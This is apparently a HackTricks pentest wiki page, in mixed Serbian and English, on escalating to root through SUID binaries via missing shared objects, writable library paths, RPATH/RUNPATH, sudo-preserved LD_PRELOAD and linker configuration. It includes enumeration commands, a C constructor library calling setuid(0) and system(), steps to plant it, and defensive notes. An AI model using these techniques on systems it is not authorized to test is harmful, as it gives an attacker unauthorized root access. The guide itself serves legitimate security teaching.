# SUID злоупотреба дељених библиотека и linker-а

{{#include ../../banners/hacktricks-training.md}}

SUID бинарне датотеке се обично проверавају због директног извршавања команди, али прилагођени SUID програми такође могу бити рањиви преко dynamic linker-а. Заједничка карактеристика је једноставна: привилегована извршна датотека учитава code са путање или из конфигурације на коју корисник са нижим привилегијама може да утиче.<sup>[[1]](#references)</sup>

Ова страница се фокусира на опште обрасце техника: missing libraries, writable library директоријуме, `RPATH`/`RUNPATH`, `LD_PRELOAD` кроз sudo, linker конфигурацију и SUID hardlink confusion.

## Брза енумација

Почните проналажењем необичних SUID датотека и провером да ли су динамички повезане:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Fokusirajte se na nestandardne lokacije, prilagođene putanje aplikacija, binarne datoteke u vlasništvu korisnika root koje se nalaze izvan direktorijuma kojima upravlja package manager i zavisnosti učitane iz direktorijuma sa dozvolom upisa.<sup>[[1]](#references)</sup>

Korisne provere mogućnosti upisa:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Neki prilagođeni SUID binarni fajlovi pokušavaju da učitaju shared object koji ne postoji. Ako se putanja koja nedostaje nalazi u direktorijumu kojim upravlja napadač, binarni fajl može učitati kod koji je dostavio napadač sa privilegijama efektivnog korisnika.<sup>[[1]](#references)</sup>

Pronađite neuspešna traženja biblioteka pomoću `strace` filtera sistemskih poziva:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ako binarni fajl pretražuje putanju sa dozvolom pisanja u potrazi za `libexample.so`, minimalna biblioteka za dokazivanje može da koristi konstruktor. Tokom validacije, dokaz uticaja održite bezopasnim:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Izgradite ga sa tačnim nazivom datoteke koju binarni fajl pokušava da učita:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Iskorišćavajući uslov nije samo biblioteka koja nedostaje. Napadač mora biti u mogućnosti da postavi kompatibilni shared object na putanju koju će privilegovani loader prihvatiti.<sup>[[1]](#references)</sup>

## Writable Library Directory

Ponekad sve dependency biblioteke postoje, ali je jedan od direktorijuma koji se koriste za njihovo pronalaženje writable. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke višeg prioriteta sa istim nazivom.<sup>[[1]](#references)</sup>

Proverite putanje dependency biblioteka:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ako je direktorijum upisiv, proverite to pristupom bezbednim za kopiranje u lab okruženju. Zamena sistemskih biblioteka na aktivnom hostu može ostaviti procese koji se istovremeno pokreću sa neusklađenim verzijama biblioteka.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` i `RUNPATH` su entries u dynamic-section-u koji loader-u govore gde da traži biblioteke. Opasni su u SUID programima kada pokazuju na direktorijume u koje attacker može da upisuje.<sup>[[1]](#references)</sup>

Detektujte ih:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Primer rizičnog izlaza:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ako je `/opt/app/lib` upisiv i binarni fajl zahteva `libcustom.so`, napadač možda može da postavi zlonamerni `libcustom.so` tamo:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nisu identični u svim detaljima razrešavanja, ali je za pregled eskalacije privilegija praktično pitanje isto: da li SUID binary pretražuje direktorijum u koji napadač može da upisuje u potrazi za imenom library-ja?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod normalnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da prisile ili utiču na učitavanje shared object-a. Kod SUID programa, dynamic loader obično ulazi u secure-execution mode i ignoriše opasne environment variables.<sup>[[1]](#references)</sup>

To znači da plain SUID binary obično nije ranjiv samo zato što korisnik može da postavi `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Uobičajeni izuzetak je sudo policy koja dozvoljava podešavanje ili očuvanje loader promenljivih za ciljnu komandu. Proverite `sudo -l` da li postoje unosi kao što su `env_keep+=LD_PRELOAD` ili `env_keep+=LD_LIBRARY_PATH`; ako je cilj dinamički linkovan, može učitati kod kojim upravlja napadač:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Nemojte mešati ove slučajeve; pravila loader-a i sudo politike iznad ih razlikuju:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` protiv običnog SUID binary-ja: obično blokiran secure execution mehanizmom.
- `LD_PRELOAD` sačuvan pomoću sudo-a: potencijalno exploitable.
- Nedostajući `.so` u writable putanji: exploitable kada SUID binary prirodno učitava tu putanju.
- `RPATH`/`RUNPATH` ka writable direktorijumu: exploitable kada potrebna biblioteka može da se kontroliše.
- Pristup za upis u `/etc/ld.so.preload` ili linker konfiguraciju: utiče na ceo sistem i ima veliki uticaj.

## Konfiguracija linkera

`ld.so` koristi linker cache i `/etc/ld.so.preload`; `ldconfig` pravi taj cache iz `/etc/ld.so.conf` i fajlova uključenih iz njega, najčešće iz `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Najvažnije provere:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names.<sup>[[9]](#references)</sup> This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Pronađite SUID files sa više od jednog linka:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ispitajte sve putanje do istog inode-a:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je **path confusion**: privilegovani inode može biti dostupan kroz naziv koji defenders ili skripte ne očekuju.<sup>[[9]](#references)</sup> Za detaljniji opis inode-a i hardlink workflow-a pogledajte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- SUID binarne fajlove držite minimalnim, proveravajte ih i, gde je moguće, upravljajte njima pomoću package manager-a.
- Izbegavajte `RPATH`/`RUNPATH` unose koji upućuju na direktorijume u koje korisnici mogu da upisuju ili kojima upravljaju aplikacije.<sup>[[1]](#references)[[8]](#references)</sup>
- Direktorijumi sa library fajlovima treba da budu u vlasništvu root-a i da obični korisnici ne mogu da ih menjaju.<sup>[[8]](#references)</sup>
- Nemojte dozvoliti da se `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične loader promenljive prosleđuju kroz sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Nadgledajte `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID fajlove.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Proveravajte SUID fajlove sa hardlink-ovima i istražite prilagođene SUID wrapper-e izvan standardnih sistemskih putanja.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
